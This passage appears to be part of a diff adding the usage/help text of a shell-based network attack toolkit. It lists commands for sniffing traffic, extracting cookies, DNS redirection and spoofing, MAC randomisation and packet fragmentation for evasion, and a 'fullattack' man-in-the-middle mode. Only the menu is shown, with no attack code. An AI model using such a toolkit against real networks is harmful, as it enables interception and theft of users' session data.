+    echo "  sniffallsave <interface> <pcap_file>"
+    echo "  extractcookies <interface> [filter]"
+    echo ""
+    echo "LOGGING & MONITORING:"
+    echo "  startlogging <log_dir> [interface]"
+    echo "  stoplogging"
+    echo "  showstats <interface>"
+    echo "  monitorattacks"
+    echo ""
+    echo "FIREWALL & FILTERING:"
+    echo "  blockport <port> [protocol]"
+    echo "  allowport <port> [protocol]"
+    echo "  createblacklist <domain1> [domain2] ..."
+    echo "  createwhitelist <domain1> [domain2] ..."
+    echo ""
+    echo "PROXY SETUP:"
+    echo "  httpproxy <port>"
+    echo "  socksproxy <port>"
+    echo ""
+    echo "STEALTH & EVASION:"
+    echo "  randommac <interface>"
+    echo "  setttl <interface> <ttl_value>"
+    echo "  fragmentpackets <interface>"
+    echo ""
+    echo "CONFIGURATION:"
+    echo "  saveconfig <config_name>"
+    echo "  loadconfig <config_name>"
+    echo ""
+    echo "REPORTING:"
+    echo "  trafficreport <pcap_file> [output_file]"
+    echo "  analyzetraffic <pcap_file>"
+    echo "  trafficreport <pcap_file>"
+    echo ""
+    echo "SYSTEM:"
+    echo "  showinterfaces"
+    echo "  sysinfo"
+    echo "  enableforward / disableforward"
+    echo "  dnsredirect <target_ip> <spoof_ip> [iface]"
+    echo "  dnsredirectoff"
+    echo ""
+    echo "RECOVERY:"
+    echo "  flushiptables"
+    echo "  fullrecovery"
+    echo "  cleanupattack"
+    echo "  fullattack <target> <gateway> <spoof_ip> [domain] [iface]"
+    echo ""
+}
